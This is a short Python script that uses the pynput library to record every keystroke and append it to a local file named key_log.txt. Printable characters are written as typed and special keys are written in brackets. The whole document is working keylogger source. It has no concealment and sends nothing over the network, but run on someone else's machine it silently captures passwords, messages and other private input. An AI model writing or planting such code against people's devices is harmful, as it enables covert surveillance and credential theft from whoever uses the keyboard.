from pynput.keyboard import Listener

Log_file = "key_log.txt"

def on_press(key):
    with open(Log_file,"a")as f:
        try:
            f.write(f"{key.char}")
        except AttributeError:
            f.write(f"[{key}]")

with Listener(on_press=on_press)as Listener:
    Listener.join()